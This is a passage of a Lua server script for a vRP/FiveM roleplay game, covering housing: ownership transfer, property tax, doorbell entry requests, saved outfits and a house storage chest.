					TriggerClientEvent("Notify",source,"negado","Permissões da residência <b>"..tostring(args[2]).."</b>: <br>"..permissoes,20000)
				else
					TriggerClientEvent("Notify",source,"negado","Nenhuma permissão encontrada.",20000)
				end
			end
		elseif args[1] == "transfer" and homes[tostring(args[2])] then
			local myHomes = vRP.query("homes/get_homeuserowner",{ user_id = parseInt(user_id), home = tostring(args[2]) })
			if myHomes[1] then
				local identity = vRP.getUserIdentity(parseInt(args[3]))
				if identity then
					local ok = vRP.request(source,"Transferir a residência <b>"..tostring(args[2]).."</b> para <b>"..identity.name.." "..identity.firstname.."</b>?",30)
					if ok then
						vRP.execute("homes/rem_allpermissions",{ home = tostring(args[2]) })
						vRP.execute("homes/buy_permissions",{ home = tostring(args[2]), user_id = parseInt(args[3]), tax = parseInt(myHomes[1].tax) })
						TriggerClientEvent("Notify",source,"importante","Transferiu a residência <b>"..tostring(args[2]).."</b> para <b>"..identity.name.." "..identity.firstname.."</b>.",10000)
					end
				end
			end
		elseif args[1] == "tax" and homes[tostring(args[2])] then
			local ownerHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(args[2]) })
			if ownerHomes[1] then
				if vRP.tryFullPayment(user_id,parseInt(homes[tostring(args[2])][1]*0.10)) then
					vRP.execute("homes/rem_permissions",{ home = tostring(args[2]), user_id = parseInt(ownerHomes[1].user_id) })
					vRP.execute("homes/buy_permissions",{ home = tostring(args[2]), user_id = parseInt(ownerHomes[1].user_id), tax = parseInt(os.time()) })
					TriggerClientEvent("Notify",source,"sucesso","Pagamento de <b>$"..vRP.format(parseInt(homes[tostring(args[2])][1]*0.1)).." dólares</b> efetuado com sucesso.",10000)
				else
					TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
				end
			end
		else
			local myHomes = vRP.query("homes/get_homeuserid",{ user_id = parseInt(user_id) })
			if parseInt(#myHomes) >= 1 then
				for k,v in pairs(myHomes) do
					local ownerHomes = vRP.query("homes/get_homeuseridowner",{ home = tostring(v.home) })
					if ownerHomes[1] then
						if parseInt(os.time()) >= parseInt(ownerHomes[1].tax+24*15*60*60) then
							TriggerClientEvent("Notify",source,"negado","<b>Residência:</b> "..v.home.."<br><b>Property Tax:</b> Atrasado",20000)
						else
							TriggerClientEvent("Notify",source,"importante","<b>Residência:</b> "..v.home.."<br>Taxa em "..vRP.getDayHours(parseInt(86400*15-(os.time()-ownerHomes[1].tax))),20000)
						end
						Citizen.Wait(10)
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- BLIPS
-----------------------------------------------------------------------------------------------------------------------------------------
AddEventHandler("vRP:playerSpawn",function(user_id,source,first_spawn)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local myHomes = vRP.query("homes/get_homeuserid",{ user_id = parseInt(user_id) })
		if parseInt(#myHomes) >= 1 then
			for k,v in pairs(myHomes) do
				vCLIENT.setBlipsOwner(source,v.home)
				Citizen.Wait(10)
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ACTIVEDOWNTIME
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(2000)
		for k,v in pairs(actived) do
			if v > 0 then
				actived[k] = v - 2
				if v == 0 then
					actived[k] = nil
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPERMISSIONS
-----------------------------------------------------------------------------------------------------------------------------------------
local answered = {}
function src.checkPermissions(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local identity = vRP.getUserIdentity(user_id)
		if identity then
			if not vRP.searchReturn(source,user_id) then
				local homeResult = vRP.query("homes/get_homepermissions",{ home = tostring(homeName) })
				if parseInt(#homeResult) >= 1 then
					local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
					local resultOwner = vRP.query("homes/get_homeuseridowner",{ home = tostring(homeName) })
					if myResult[1] then
						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*18*60*60) then

							local cows = vRP.getSData("chest:"..tostring(homeName))
							local rows = json.decode(cows) or {}
							if rows then
								vRP.execute("creative/rem_srv_data",{ dkey = "chest:"..tostring(homeName) })
							end

							vRP.execute("homes/rem_allpermissions",{ home = tostring(homeName) })
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> venceu por <b>3 dias</b> e a casa foi vendida.",10000)
							return false
						elseif parseInt(os.time()) <= parseInt(resultOwner[1].tax+24*15*60*60) then
							return true
						else
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> da residência está atrasada.",10000)
							return false
						end
					else
						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*18*60*60) then

							local cows = vRP.getSData("chest:"..tostring(homeName))
							local rows = json.decode(cows) or {}
							if rows then
								vRP.execute("creative/rem_srv_data",{ dkey = "chest:"..tostring(homeName) })
							end

							vRP.execute("homes/rem_allpermissions",{ home = tostring(homeName) })
							return false
						end

						if parseInt(os.time()) >= parseInt(resultOwner[1].tax+24*15*60*60) then
							TriggerClientEvent("Notify",source,"importante","A <b>Property Tax</b> da residência está atrasada.",10000)
							return false
						end

						answered[user_id] = nil
						for k,v in pairs(homeResult) do
							local player = vRP.getUserSource(parseInt(v.user_id))
							if player then
								if not answered[user_id] then
									TriggerClientEvent("Notify",player,"importante","<b>"..identity.name.." "..identity.firstname.."</b> tocou o interfone da residência <b>"..tostring(homeName).."</b>.<br>Deseja permitir a entrada do mesmo?",10000)
									local ok = vRP.request(player,"Permitir acesso a residência?",30)
									if ok then
										answered[user_id] = true
										return true
									end
								end
							end
							Citizen.Wait(10)
						end
					end
				else
					local ok = vRP.request(source,"Deseja efetuar a compra da residência <b>"..tostring(homeName).."</b> por <b>$"..vRP.format(parseInt(homes[tostring(homeName)][1])).."</b>?",30)
					if ok then
						if vRP.tryFullPayment(user_id,parseInt(homes[tostring(homeName)][1])) then
							vRP.execute("homes/buy_permissions",{ home = tostring(homeName), user_id = parseInt(user_id), tax = parseInt(os.time()) })
							TriggerClientEvent("Notify",source,"sucesso","A residência <b>"..tostring(homeName).."</b> foi comprada com sucesso.",10000)
						else
							TriggerClientEvent("Notify",source,"negado","Dinheiro insuficiente.",10000)
						end
					end
					return false
				end
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKINTPERMISSIONS
-----------------------------------------------------------------------------------------------------------------------------------------
function src.checkIntPermissions(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if not vRP.searchReturn(source,user_id) then
			local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
			if myResult[1] or vRP.hasPermission(user_id,"policia.permissao") then
				return true
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- OUTFIT
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('outfit',function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local homeName = vCLIENT.getHomeStatistics(source)
		local myResult = vRP.query("homes/get_homeuser",{ user_id = parseInt(user_id), home = tostring(homeName) })
		if myResult[1] then
			local data = vRP.getSData("outfit:"..tostring(homeName))
			local result = json.decode(data) or {}
			if result then
				if args[1] == "save" and args[2] then
					local custom = vRPclient.getCustomPlayer(source)
					if custom then
						local outname = sanitizeString(rawCommand:sub(13),sanitizes.homename[1],sanitizes.homename[2])
						if result[outname] == nil and string.len(outname) > 0 then
							result[outname] = custom
							vRP.setSData("outfit:"..tostring(homeName),json.encode(result))
							TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> adicionado com sucesso.",10000)
						else
							TriggerClientEvent("Notify",source,"importante","Nome escolhido já existe na lista de <b>Outfits</b>.",10000)
						end
					end
				elseif args[1] == "rem" and args[2] then
					local outname = sanitizeString(rawCommand:sub(12),sanitizes.homename[1],sanitizes.homename[2])
					if result[outname] ~= nil and string.len(outname) > 0 then
						result[outname] = nil
						vRP.setSData("outfit:"..tostring(homeName),json.encode(result))
						TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> removido com sucesso.",10000)
					else
						TriggerClientEvent("Notify",source,"negado","Nome escolhido não encontrado na lista de <b>Outfits</b>.",10000)
					end
				elseif args[1] == "apply" and args[2] then
					local outname = sanitizeString(rawCommand:sub(14),sanitizes.homename[1],sanitizes.homename[2])
					if result[outname] ~= nil and string.len(outname) > 0 then
						TriggerClientEvent("updateRoupas",source,result[outname])
						TriggerClientEvent("Notify",source,"sucesso","Outfit <b>"..outname.."</b> aplicado com sucesso.",10000)
					else
						TriggerClientEvent("Notify",source,"negado","Nome escolhido não encontrado na lista de <b>Outfits</b>.",10000)
					end
				else
					for k,v in pairs(result) do
						TriggerClientEvent("Notify",source,"importante","<b>Outfit:</b> "..k,20000)
						Citizen.Wait(10)
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- OPENCHEST
-----------------------------------------------------------------------------------------------------------------------------------------
function src.openChest(homeName)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local hsinventory = {}
		local myinventory = {}
		local data = vRP.getSData("chest:"..tostring(homeName))
		local result = json.decode(data) or {}
		if result then
			for k,v in pairs(result) do
				table.insert(hsinventory,{ amount = parseInt(v.amount), name = vRP.itemNameList(k), index = vRP.itemIndexList(k), key = k, peso = vRP.getItemWeight(k) })
			end

			local inv = vRP.getInventory(parseInt(user_id))
			for k,v in pairs(inv) do
				table.insert(myinventory,{ amount = parseInt(v.amount), name = vRP.itemNameList(k), index = vRP.itemIndexList(k), key = k, peso = vRP.getItemWeight(k) })
			end
		end
		return hsinventory,myinventory,vRP.getInventoryWeight(user_id),vRP.getInventoryMaxWeight(user_id),vRP.computeItemsWeight(result),parseInt(homes[tostring(homeName)][3])
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STOREITEM
-----------------------------------------------------------------------------------------------------------------------------------------
function src.storeItem(homeName,itemName,amount)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		if user_id and actived[parseInt(user_id)] == 0 or not actived[parseInt(user_id)] then
			if string.match(itemName,"identidade") then
				TriggerClientEvent("Notify",source,"importante","Não pode guardar este item.",8000)
				return
			end

			local data = vRP.getSData("chest:"..tostring(homeName))
			local items = json.decode(data) or {}
			if items then
				if parseInt(amount) > 0 then
					local new_weight = vRP.computeItemsWeight(items)+vRP.getItemWeight(itemName)*parseInt(amount)
					if new_weight <= parseInt(homes[tostring(homeName)][3]) then
						if vRP.tryGetInventoryItem(parseInt(user_id),itemName,parseInt(amount)) then
							if items[itemName] ~= nil then
								items[itemName].amount = parseInt(items[itemName].amount) + parseInt(amount)
							else
								items[itemName] = { amount = parseInt(amount) }
							end
							actived[parseInt(user_id)] = 2
						end
					else
						TriggerClientEvent("Notify",source,"negado","<b>Vault</b> cheio.",8000)
					end
				else
					local inv = vRP.getInventory(parseInt(user_id))
					for k,v in pairs(inv) do
						if itemName == k then
							local new_weight = vRP.computeItemsWeight(items)+vRP.getItemWeight(itemName)*parseInt(v.amount)
							if new_weight <= parseInt(homes[tostring(homeName)][3]) then
								if vRP.tryGetInventoryItem(parseInt(user_id),itemName,parseInt(v.amount)) then
									if items[itemName] ~= nil then
										items[itemName].amount = parseInt(items[itemName].amount) + parseInt(v.amount)
									else
										items[itemName] = { amount = parseInt(v.amount) }
									end
									actived[parseInt(user_id)] = 2
								end
							else
								TriggerClientEvent("Notify",source,"negado","<b>Vault</b> cheio.",8000)
							end
						end
					end
				end
				vRP.setSData("chest:"..tostring(homeName),json.encode(items))
				TriggerClientEvent('Creative:UpdateVault',source,'updateVault')
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- TAKEITEM
-----------------------------------------------------------------------------------------------------------------------------------------
local lock_table = {}

function has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

Citizen.CreateThread( function()
	while true do
		Citizen.Wait(500)
		lock_table = {}
	end
end)

function src.takeItem(homeName,itemName,amount)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		if user_id and actived[parseInt(user_id)] == 0 or not actived[parseInt(user_id)] then
			local data = vRP.getSData("chest:"..tostring(homeName))
			local items = json.decode(data) or {}
			if items then
				if parseInt(amount) > 0 then
					if items[itemName] ~= nil and parseInt(items[itemName].amount) >= parseInt(amount) then
						if vRP.getInventoryWeight(parseInt(user_id))+vRP.getItemWeight(itemName)*parseInt(amount) <= vRP.getInventoryMaxWeight(parseInt(user_id)) and not has_value(lock_table, user_id) then
							table.insert(lock_table, user_id)
							vRP.giveInventoryItem(parseInt(user_id),itemName,parseInt(amount))
							items[itemName].amount = parseInt(items[itemName].amount) - parseInt(amount)

							if parseInt(items[itemName].amount) <= 0 then
								items[itemName] = nil
							end
							actived[parseInt(user_id)] = 2
						else
							TriggerClientEvent("Notify",source,"negado","<b>Mochila</b> cheia.",8000)
						end
					end
				else
					if items[itemName] ~= nil and parseInt(items[itemName].amount) >= parseInt(amount) then
						if vRP.getInventoryWeight(parseInt(user_id))+vRP.getItemWeight(itemName)*parseInt(items[itemName].amount) <= vRP.getInventoryMaxWeight(parseInt(user_id)) then
							vRP.giveInventoryItem(parseInt(user_id),itemName,parseInt(items[itemName].amount))
							items[itemName] = nil
							actived[parseInt(user_id)] = 2
						else
							TriggerClientEvent("Notify",source,"negado","<b>Mochila</b> cheia.",8000)
						end
					end
				end
				TriggerClientEvent('Creative:UpdateVault',source,'updateVault')
				vRP.setSData("chest:"..tostring(homeName),json.encode(items))
			end
		end
	end
	return false
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPOLICE
-----------------------------------------------------------------------------------------------------------------------------------------
function src.checkPolice()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id,"policia.permissao") then
			return true
		end
		return false
	end
end